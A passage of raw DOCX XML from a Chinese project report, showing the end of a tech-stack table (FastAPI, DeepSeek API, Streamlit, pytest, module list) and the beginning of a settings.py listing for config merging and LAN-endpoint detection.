            <w:tcW w:w="3402" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="3DD8555B">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>五模型对比与在线推理</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="5EC1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13367247">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>服务端</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3742" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="13BF9B4A">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>FastAPI + Uvicorn、SQLite</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="338CDFE9">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>八个 HTTP 路由，四张表</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="5089D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48CECE4F">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>大模型</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3742" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="350C4D5F">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>DeepSeek Chat API（备用：通义千问）</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="74A93024">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>HTTP 调用，temperature 0.2</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="50249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36A6ED7D">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>前端</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3742" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="111B4224">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Streamlit + Plotly</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="55FD4830">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>四标签页看板，fragment 局部刷新</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="516DF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474" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="6BC5CD05">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>测试</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3742" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="0E92EF9D">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>pytest</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="101A8036">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>59 条，以合成数据为主</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="17E6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vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="01B618D6">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>代码量</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3742" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="5C0C7339">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>5 677 行 Python + 643 行文档</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="56D6A931">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>probe/center/llm/models/tools/attack/dashboard/tests</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7F141DE4">
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0A29AD87">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>下面把公共骨架与本报告配图脚本一并列出，供复现环境使用。它们不属于任何一个人的专有模块，但少了这些文件整个工程起不来。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19E40372">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="160" w:after="40"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>代码 3-1　settings.py</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>（53 行）　配置加载与局域网判定</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="502013E6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>"""配置加载：config.yaml 为默认值，config.local.yaml 若存在则深度合并覆盖。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47600CDE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1AF125BD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>本地覆盖文件不进版本库（见 .gitignore），用来放 token、网卡名、中心地址这类</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30F2F754">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>因机器而异的设置，避免每次改主配置。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DE62A30">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5541DF41">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3D8D67E6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from __future__ import annotations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72209F3C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="11919AEE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import ipaddress</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="780CC2DC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from pathlib import Path</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57FFEF88">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from urllib.parse import urlsplit</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="423826BF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2E377178">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import yaml</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F2C492B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1C01CDD3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="18625058">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def is_local_endpoint(url: str) -&gt; bool:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02F63F63">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """中心服务是否在本机/局域网内。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A79227A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6952F093">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    用来决定 HTTP 客户端要不要读代理环境变量。探针向局域网中心上报时如果还走</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11E670D4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ALL_PROXY，会绕一圈甚至直接失败——本机把 ALL_PROXY 写成 `socks://`（httpx 只认</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39ADED02">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    `socks5://`）时，httpx 在 **构造 Client 的阶段**就抛 ValueError，连重试的机会都没有。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59A40E50">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34717E9C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    host = urlsplit(url).hostname or ""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EBC80B1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if host in ("localhost", ""):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51EC6D1E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12288A34">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    try:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DC3673E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        ip = ipaddress.ip_address(host)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52C6D0E5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    except ValueError:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="339A6D44">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return False  # 域名一律当远端，该走代理就走代理</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="227E5A09">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return ip.is_private or ip.is_loopback or ip.is_link_local</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34100D21">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="13A6BFD3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5F33F469">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def deep_merge(base: dict, extra: dict) -&gt; dict:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09659427">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    out = dict(base)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E2DF8A2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    for key, val in extra.items():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E3EF2B2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if isinstance(val, dict) and isinstance(out.get(key), dict):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69A52A40">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            out[key] = deep_merge(out[key], val)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0253E41A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C29FA4F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            out[key] = val</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C4FAF56">
      <w:pPr>
        <w:widowControl w:val="0"/>
